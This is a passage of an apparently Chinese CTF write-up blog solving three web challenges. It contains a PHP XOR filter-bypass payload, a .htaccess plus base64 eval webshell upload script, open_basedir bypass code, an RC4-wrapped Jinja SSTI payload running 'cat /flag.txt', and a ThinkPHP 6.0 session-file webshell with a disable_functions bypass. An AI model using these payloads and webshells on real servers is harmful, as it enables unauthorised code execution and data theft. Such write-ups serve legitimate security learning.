class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">37</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>,<span class="hljs-number">42</span>,<span class="hljs-number">43</span>,<span class="hljs-number">45</span>,<span class="hljs-number">47</span>,<span class="hljs-number">58</span>,<span class="hljs-number">59</span>,<span class="hljs-number">60</span>,<span class="hljs-number">62</span>,<span class="hljs-number">63</span>,<span class="hljs-number">64</span>,<span class="hljs-number">92</span>,<span class="hljs-number">93</span>,<span class="hljs-number">94</span>,<span class="hljs-number">123</span>,<span class="hljs-number">125</span>,<span class="hljs-number">128</span>,<span class="hljs-number">129</span>,<span class="hljs-number">130</span>,<span class="hljs-number">131</span>,<span class="hljs-number">132</span>,<span class="hljs-number">133</span>,<span class="hljs-number">134</span>,<span class="hljs-number">135</span>,<span class="hljs-number">136</span>,<span class="hljs-number">137</span>,<span class="hljs-number">138</span>,<span class="hljs-number">139</span>,<span class="hljs-number">140</span>,<span class="hljs-number">141</span>,<span class="hljs-number">142</span>,<span class="hljs-number">143</span>,<span class="hljs-number">144</span>,<span class="hljs-number">145</span>,<span class="hljs-number">146</span>,<span class="hljs-number">147</span>,<span class="hljs-number">148</span>,<span class="hljs-number">149</span>,<span class="hljs-number">150</span>,<span class="hljs-number">151</span>,<span class="hljs-number">152</span>,<span class="hljs-number">153</span>,<span class="hljs-number">154</span>,<span class="hljs-number">155</span>,<span class="hljs-number">156</span>,<span class="hljs-number">157</span>,<span class="hljs-number">158</span>,<span class="hljs-number">159</span>,<span class="hljs-number">160</span>,<span class="hljs-number">161</span>,<span class="hljs-number">162</span>,<span class="hljs-number">163</span>,<span class="hljs-number">164</span>,<span class="hljs-number">165</span>,<span class="hljs-number">166</span>,<span class="hljs-number">167</span>,<span class="hljs-number">168</span>,<span class="hljs-number">169</span>,<span class="hljs-number">170</span>,<span class="hljs-number">171</span>,<span class="hljs-number">172</span>,<span class="hljs-number">173</span>,<span class="hljs-number">174</span>,<span class="hljs-number">175</span>,<span class="hljs-number">176</span>,<span class="hljs-number">177</span>,<span class="hljs-number">178</span>,<span class="hljs-number">179</span>,<span class="hljs-number">180</span>,<span class="hljs-number">181</span>,<span class="hljs-number">182</span>,<span class="hljs-number">183</span>,<span class="hljs-number">184</span>,<span class="hljs-number">185</span>,<span class="hljs-number">186</span>,<span class="hljs-number">187</span>,<span class="hljs-number">188</span>,<span class="hljs-number">189</span>,<span class="hljs-number">190</span>,<span class="hljs-number">191</span>,<span class="hljs-number">192</span>,<span class="hljs-number">193</span>,<span class="hljs-number">194</span>,<span class="hljs-number">195</span>,<span class="hljs-number">196</span>,<span class="hljs-number">197</span>,<span class="hljs-number">198</span>,<span class="hljs-number">199</span>,<span class="hljs-number">200</span>,<span class="hljs-number">201</span>,<span class="hljs-number">202</span>,<span class="hljs-number">203</span>,<span class="hljs-number">204</span>,<span class="hljs-number">205</span>,<span class="hljs-number">206</span>,<span class="hljs-number">207</span>,<span class="hljs-number">208</span>,<span class="hljs-number">209</span>,<span class="hljs-number">210</span>,<span class="hljs-number">211</span>,<span class="hljs-number">212</span>,<span class="hljs-number">213</span>,<span class="hljs-number">214</span>,<span class="hljs-number">215</span>,<span class="hljs-number">216</span>,<span class="hljs-number">217</span>,<span class="hljs-number">218</span>,<span class="hljs-number">219</span>,<span class="hljs-number">220</span>,<span class="hljs-number">221</span>,<span class="hljs-number">222</span>,<span class="hljs-number">223</span>,<span class="hljs-number">224</span>,<span class="hljs-number">225</span>,<span class="hljs-number">226</span>,<span class="hljs-number">227</span>,<span class="hljs-number">228</span>,<span class="hljs-number">229</span>,<span class="hljs-number">230</span>,<span class="hljs-number">231</span>,<span class="hljs-number">232</span>,<span class="hljs-number">233</span>,<span class="hljs-number">234</span>,<span class="hljs-number">235</span>,<span class="hljs-number">236</span>,<span class="hljs-number">237</span>,<span class="hljs-number">238</span>,<span class="hljs-number">239</span>,<span class="hljs-number">240</span>,<span class="hljs-number">241</span>,<span class="hljs-number">242</span>,<span class="hljs-number">243</span>,<span class="hljs-number">244</span>,<span class="hljs-number">245</span>,<span class="hljs-number">246</span>,<span class="hljs-number">247</span>,<span class="hljs-number">248</span>,<span class="hljs-number">249</span>,<span class="hljs-number">250</span>,<span class="hljs-number">251</span>,<span class="hljs-number">252</span>,<span class="hljs-number">253</span>,<span class="hljs-number">254</span>,<span class="hljs-number">255</span>];<br>	<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">27</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$i</span>++)&#123;<br>		<span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">27</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$j</span>++)&#123;<br>			<span class="hljs-variable">$x</span> = <span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-variable">$j</span>];<br>			<span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$k</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>);<span class="hljs-variable">$k</span>++)&#123;<br>				<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>]) == <span class="hljs-variable">$x</span>)&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;%&#x27;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>]) . <span class="hljs-string">&#x27;^%&#x27;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$j</span>]).<span class="hljs-string">&quot;\n&quot;</span>;<br>					<span class="hljs-variable">$index</span>++;<br>					<span class="hljs-keyword">if</span>(<span class="hljs-variable">$index</span> == <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>))&#123;<br>						<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>					&#125;<br>				&#125;<br>			&#125;<br>		&#125;<br>	&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">finds</span>(<span class="hljs-string">&quot;_GET&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/5BFCF02568634797A09551490EB4699D.png" srcset="/img/loading.gif" lazyload><br><strong>关于异或绕过</strong></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">php的<span class="hljs-keyword">eval</span>()函数在执行时如果内部有类似<span class="hljs-string">&quot;abc&quot;</span>^<span class="hljs-string">&quot;def&quot;</span>的计算式，那么就先进行计算再执行。例如url?a=&#123;_GET&#125;&#123;b&#125;();&amp;b=phpinfo,也就是?a=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo,在传入后实际上为$&#123;????^????&#125;&#123;?&#125;();但是到了<span class="hljs-keyword">eval</span>()函数内部就会变成$&#123;_GET&#125;&#123;?&#125;();成功执行。<br></code></pre></td></tr></table></figure>
<p>详细看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11546422.html">Hanamizuki花水木php异或计算绕过preg_match</a></p>
<p>我们构造出payload</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-number">_</span>=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo<br>//相当于$&#123;_GET&#125;&#123;%86&#125;(),这里phpinfo的括号是在前面<br></code></pre></td></tr></table></figure>

<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p><img src="/images/C44A42F58EDA4d0e8303A1F89CD6A7C8.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>先看一下disable_functions，发现ban了很多命令执行函数system、exec等</p>
<p>我们从get_the_flag()上手，<br>函数是上传文件，且对后缀名进行了过滤，不能上传有ph的后缀文件，phtml，php等也不能上传了，可以考虑.htaccess和.user.ini，不过这里.user.ini好像不行，对内容进行了过滤，不能包含&lt;?,由于这里版本过高，所以<script language="php"></script>无法使用<br>这里的解决方法是将一句话木马进行base64编码，然后再.htaccess中利用php伪协议进行解码，还有个文件头检测，一般都用GIF89a进行绕过，但这里会出现问题，.htaccess文件会无法生效，我们可以使用#define width 1337 #define height 1337进行绕过，#在.htaccess中表示注释<br>比较完全的htaccess解释<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8267?time__1311=n4+xuDgDBDyBD=D77D/+W4M0+34iIqm5x&alichlgref=https://www.cnblogs.com/">Apache的.htaccess利用技巧</a><br>所以我们的.htaccess文件内容如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 1337 </span><br>AddType application/x-httpd-php .ahhh  <span class="hljs-meta">#对.ahhh后缀的文件作为php文件执行</span><br>php_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br></code></pre></td></tr></table></figure>

<p>shell.ahhh</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GIF89a12</span>		#<span class="hljs-number">12</span>是为了补足<span class="hljs-number">8</span>个字节，满足base64编码的规则,<span class="hljs-number">4</span>的倍数<br><span class="hljs-attribute">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs</span>/Pg==<br></code></pre></td></tr></table></figure>

<p>上传脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>import base64<br><br>htaccess = b<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337 </span><br><span class="hljs-string">AddType application/x-httpd-php .ahhh</span><br><span class="hljs-string">php_value auto_append_file &quot;</span>php:<span class="hljs-comment">//filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">shell = b&quot;</span>GIF89a12<span class="hljs-string">&quot; + base64.b64encode(b&quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot;)</span><br><span class="hljs-string">url = &quot;</span>http:<span class="hljs-comment">//95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span><br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>data = &#123;<span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>response = requests.<span class="hljs-title function_ invoke__">post</span>(url=url, data=data, files=files)<br><span class="hljs-keyword">print</span>(response.text)<br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.ahhh&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>response = requests.<span class="hljs-title function_ invoke__">post</span>(url=url, data=data, files=files)<br><span class="hljs-keyword">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/five3/article/details/74913742">python的requests发送&#x2F;上传多个文件</a></p>
<p><img src="/images/45EAA90DD51A4524B05CFB719E3CF684.png" srcset="/img/loading.gif" lazyload><br>得到路径<br>连一下蚁剑<br><img src="/images/6A11D0003F384441BE67422C65C55FB9.png" srcset="/img/loading.gif" lazyload><br>很意外的是我可以直接访问根目录，且能读取到flag的值<br>在php配置里可以看到<br><img src="/images/A51B191187D14954B78295EFBB0BE955.png" srcset="/img/loading.gif" lazyload><br>我们只能访问&#x2F;html下和&#x2F;tmp下的文件<br>这里我们需要绕过open_basedir<br>参考<a href="https://xz.aliyun.com/t/4720?time__1311=n4+xnD0D9DBDgG7Y5GNepDUhDIowDmxhqeAKvbx&alichlgref=https://link.csdn.net/?target=https%253A%252F%252Fxz.aliyun.com%252Ft%252F4720">bypass open_basedir的新方法</a></p>
<p>直接用它的代码</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">chdir</span>(&#x27;img&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;/&#x27;);<span class="hljs-built_in">var_dump</span>(scandir(&quot;/&quot;));<br></code></pre></td></tr></table></figure>
<p>得到<br><img src="/images/1C225E976EAD4011926B0378B4451A0A.png" srcset="/img/loading.gif" lazyload></p>
<p>在读取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-built_in">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-built_in">echo</span>(file_get_contents(<span class="hljs-string">&#x27;/THis_Is_tHe_F14g&#x27;</span>));<br></code></pre></td></tr></table></figure>
<p>获得flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">44</span>ad039b-<span class="hljs-number">8376</span>-<span class="hljs-number">46</span>ac-ba89-<span class="hljs-number">405</span>bec17ded2&#125;<br></code></pre></td></tr></table></figure>



<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>进入环境<br>题目让我们找secret，先robots.txt找一找<br>It is Android ctf<br>不知道什么意思，那么试试进入secret路径下<br>Tell me your secret.I will encrypt it so others can’t see<br>还要secret，那么给它一个secret参数<br>输入0，1，2页面显示不同的字符<br>刚开始还以为是什么规律<br>随便输入一个长一点的数字或字符<br><img src="/images/AB635E37F9B34eccBC86040CCA879EDD.png" srcset="/img/loading.gif" lazyload><br>报错了，但也暴露了部分源码，可以看到是flask，python版本是2.7<br>找到加深的一段代码<br><img src="/images/F7EC073B2F7743f4810C06D53C4E2A64.png" srcset="/img/loading.gif" lazyload><br>为RC4加密算法，密钥泄露了，将所发送内容解密之后会被渲染，考虑到存在模板注入<br>找一个RC4加密脚本</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import <span class="hljs-built_in">base64</span><br>from urllib.parse import quote<br>def rc4_main(<span class="hljs-built_in">key</span> = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span>):<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;RC4加密主函数&quot;</span>)<br>    s_box = rc4_init_sbox(<span class="hljs-built_in">key</span>)<br>    crypt = str(rc4_excrypt(message, s_box))<br>    # <span class="hljs-built_in">print</span>(crypt)<br>    <span class="hljs-built_in">return</span>  crypt<br>def rc4_init_sbox(<span class="hljs-built_in">key</span>):<br>    s_box = list(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;原来的 s 盒：%s&quot;</span> <span class="hljs-symbol">%</span> s_box)<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + ord(<span class="hljs-built_in">key</span>[i <span class="hljs-symbol">%</span> len(<span class="hljs-built_in">key</span>)])) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;混乱后的 s 盒：%s&quot;</span><span class="hljs-symbol">%</span> s_box)<br>    <span class="hljs-built_in">return</span> s_box<br>def rc4_excrypt(plain, <span class="hljs-built_in">box</span>):<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;调用加密程序成功。&quot;</span>)<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        j = (j + <span class="hljs-built_in">box</span>[i]) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        <span class="hljs-built_in">box</span>[i], <span class="hljs-built_in">box</span>[j] = <span class="hljs-built_in">box</span>[j], <span class="hljs-built_in">box</span>[i]<br>        t = (<span class="hljs-built_in">box</span>[i] + <span class="hljs-built_in">box</span>[j]) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        k = <span class="hljs-built_in">box</span>[t]<br>        res.<span class="hljs-built_in">append</span>(chr(ord(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-built_in">join</span>(res)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))<br>    <span class="hljs-built_in">return</span> (str(<span class="hljs-built_in">base64</span>.b64encode(cipher.encode(&#x27;utf-<span class="hljs-number">8</span>&#x27;)), &#x27;utf-<span class="hljs-number">8</span>&#x27;))<br>rc4_main(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>加密有点捉不住头脑，看了一下，这个解释的比较清晰<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1G64y1Y7p4/?spm_id_from=333.337.search-card.all.click&vd_source=1cf6120088cfd0411cf76da1c98383fb">RC4加密算法</a></p>
<p><img src="/images/D00CD397F38444d5B79D6260F505DBA6.png" srcset="/img/loading.gif" lazyload></p>
<p>提交后就可以获取flag了<br><img src="/images/4AB2BC9DB8054323BDE54F6B662FE158.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>有注册登录功能，先怀疑一下xss，试试xss语句<br><img src="/images/50955E21F1B349019338CEF969CB6E4B.png" srcset="/img/loading.gif" lazyload></p>
<p>注册一下，弹出报错信息告诉是thinkphp框架6.0版本</p>
<p><img src="/images/3480C8D74A0B47058B1D1CA4772A1C81.png" srcset="/img/loading.gif" lazyload></p>
<p>搜一下发现这个版本有一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_29009501/article/details/116093713?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~PaidSort-1-116093713-blog-123237118.235%5Ev43%5Epc_blog_bottom_relevance_base8&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~PaidSort-1-116093713-blog-123237118.235%5Ev43%5Epc_blog_bottom_relevance_base8&utm_relevant_index=1">任意文件操作漏洞</a></p>
<p>这个框架还有很多其它的漏洞</p>
<p>可用dirsearch扫出<code>www.zip</code>源码泄露<br>在app&#x2F;home&#x2F;controller&#x2F;Member.php中找到网站功能的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">......&lt;以上代码省略&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);            <br>            &#125;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>            <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))<br>            &#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-variable">$recordArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$record</span>);<br>                <span class="hljs-variable">$recordLen</span> = <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$recordArr</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$recordLen</span> &gt;= <span class="hljs-number">3</span>)&#123;<br>                    <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$recordArr</span>);<br>                    <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$recordArr</span>) . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);    <span class="hljs-comment">//注意这里，直接将搜索的内容写入了服务器生成的SESSION文件中</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$record</span> . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">View</span>(<span class="hljs-string">&quot;search&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>根据ThinkPHP6.0.0版本的漏洞成因，得出这是一个由于不安全的SessionId导致的任意文件操作漏洞<br>漏洞利用的方法是：构造PHPSESSID的值，且后缀为php，总共32位<br>先注册<br>用burp抓取,修改PHPSESSID的值<br><img src="/images/E82C046F1859405f8BA151BF05C4C230.png" srcset="/img/loading.gif" lazyload><br>登录<br>本题中，搜素的内容直接被写入了SESSION</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">session(<span class="hljs-string">&quot;Record&quot;</span>,implode(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-symbol">$recordArr</span>) . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-symbol">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br></code></pre></td></tr></table></figure>

<p>所以我们在搜索框写入shell<br><img src="/images/96567671AD34b85BE2C6B5484094F63.png" srcset="/img/loading.gif" lazyload><br>提交完shell内容后可以在&#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php中得到我们的shell<br><img src="/images/1398418967A347a68D8380A9A7DB2EF3.png" srcset="/img/loading.gif" lazyload><br>发现一些重要函数被禁了<br><img src="/images/CD6A3D5E30E44b9291BCCD3527099549.png" srcset="/img/loading.gif" lazyload><br>连接蚁剑<br><img src="/images/53BE9C8D0DA84c0989423A0F4EEC29ED.png" srcset="/img/loading.gif" lazyload><br>flag为空，那么就要用readflag读取flag<br><img src="/images/1B8B00A46E3149e4BC39198427A276A3.png" srcset="/img/loading.gif" lazyload><br>没有权限，用蚁剑里的插件disable_functions绕过<br><img src="/images/E62D81242CD2400884944C9A3AB0E4F0.png" srcset="/img/loading.gif" lazyload><br>这个就刚刚好<br>加载插件就可以执行命令了<br><img src="/images/8A74149033774a169C2F833832F1C739.png" srcset="/img/loading.gif" lazyload></p>
<p>还有一种方法是上传exp<br>找到<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">PHP7.0-7.4版本的突破disable_function的exp</a><br>把执行的命令修改为&#x2F;readflag,然后将exp上传至shell中即可获得flag在蚁剑中找个能上传文件的地方，比如&#x2F;var&#x2F;tmp中</p>
